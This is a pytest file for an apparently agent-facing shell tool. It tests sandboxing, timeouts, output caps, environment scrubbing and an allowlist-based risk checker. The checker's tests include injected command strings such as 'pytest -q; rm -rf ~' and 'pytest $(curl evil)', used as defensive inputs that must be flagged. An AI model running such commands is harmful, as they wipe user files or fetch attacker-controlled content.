"""The shell tool's subprocess limits and the bubblewrap sandbox."""

import os
import shutil
import sys
import tempfile
import time

import pytest

from hive.tools.shell import _bwrap_works, run_command

PY = f'"{sys.executable}"'
# Inside bubblewrap /tmp is a fresh, empty tmpfs, so an interpreter living under /tmp
# (a throwaway venv) isn't visible there; use the system one for sandboxed commands.
_tmp = os.path.realpath(tempfile.gettempdir())
PY_BOX = PY if not os.path.realpath(sys.executable).startswith(_tmp) and not sys.executable.startswith(_tmp) else "python3"


def py(sandbox: str) -> str:
    return PY_BOX if sandbox == "bwrap" else PY
HAVE_BWRAP = sys.platform != "win32" and bool(shutil.which("bwrap")) and _bwrap_works(shutil.which("bwrap"))
MODES = ["none"] + (["bwrap"] if HAVE_BWRAP else [])


@pytest.fixture
def dirs(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    return ws, tmp_path / "scratch"


async def sh(cmd, dirs, sandbox="none", **kw):
    ws, scratch = dirs
    return await run_command(cmd, ws, timeout=kw.get("timeout", 20), max_output=kw.get("max_output", 64000), sandbox=sandbox, scratch=scratch)


@pytest.mark.parametrize("sandbox", MODES)
async def test_output_and_exit_code(dirs, sandbox):
    r = await sh(f"{py(sandbox)} -c \"print('hello')\"", dirs, sandbox)
    assert r.exit_code == 0 and r.output.strip() == "hello" and r.sandbox == sandbox
    r = await sh(f"{py(sandbox)} -c \"import sys; sys.exit(3)\"", dirs, sandbox)
    assert r.exit_code == 3


@pytest.mark.parametrize("sandbox", MODES)
async def test_runs_in_workspace(dirs, sandbox):
    r = await sh(f"{py(sandbox)} -c \"import os; print(os.getcwd())\"", dirs, sandbox)
    assert os.path.realpath(r.output.strip()) == os.path.realpath(dirs[0])


async def test_timeout_kills(dirs):
    start = time.monotonic()
    r = await sh(f"{PY} -c \"import time; time.sleep(30)\"", dirs, timeout=0.5)
    assert r.timed_out and time.monotonic() - start < 10


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX process groups")
@pytest.mark.parametrize("sandbox", MODES)
async def test_timeout_kills_background_children(dirs, sandbox):
    ws, _ = dirs
    r = await sh("(sleep 1.5; touch late.txt) & sleep 30", dirs, sandbox, timeout=0.5)
    assert r.timed_out
    time.sleep(2.0)
    assert not (ws / "late.txt").exists()


async def test_output_is_capped_head_and_tail(dirs):
    r = await sh(f"{PY} -c \"print('A' * 100000 + 'END')\"", dirs, max_output=2000)
    assert len(r.output) < 3000 and "bytes cut" in r.output and r.output.rstrip().endswith("END")


async def test_environment_is_scrubbed(dirs, monkeypatch):
    monkeypatch.setenv("HIVE_SECRET_TOKEN", "hunter2")
    r = await sh(f"{PY} -c \"import os; print(os.environ.get('HIVE_SECRET_TOKEN', 'none'), os.environ.get('HOME'))\"", dirs)
    secret, home = r.output.split()
    assert secret == "none" and os.path.realpath(home) == os.path.realpath(dirs[1])


@pytest.mark.skipif(not HAVE_BWRAP, reason="bubblewrap not available")
async def test_bwrap_blocks_writes_outside_and_network(dirs, tmp_path):
    ws, _ = dirs
    r = await sh(f"touch {tmp_path}/escaped.txt; touch inside.txt", dirs, "bwrap")
    assert not (tmp_path / "escaped.txt").exists() and (ws / "inside.txt").exists()
    r = await sh(f"{PY_BOX} -c \"import socket; socket.create_connection(('1.1.1.1', 53), 2); print('connected')\"", dirs, "bwrap")
    assert "connected" not in r.output.splitlines() and r.exit_code != 0  # (3.13 tracebacks quote the source line)


def test_risky_unless_allowlisted_and_plain():
    from types import SimpleNamespace

    from hive.config import HiveConfig
    from hive.tools.shell import _risky

    hive = HiveConfig.model_validate({"shell": {"allow": ["pytest", "python -m pytest"]}})
    ctx = SimpleNamespace(run=SimpleNamespace(app=SimpleNamespace(settings=SimpleNamespace(hive=hive))))
    assert not _risky(ctx, {"command": "pytest -q"})
    assert not _risky(ctx, {"command": "python -m pytest tests"})
    assert _risky(ctx, {"command": "pytest -q; rm -rf ~"})
    assert _risky(ctx, {"command": "pytest $(curl evil)"})
    assert _risky(ctx, {"command": "pytesting"})
    assert _risky(ctx, {"command": "rm -rf build"})
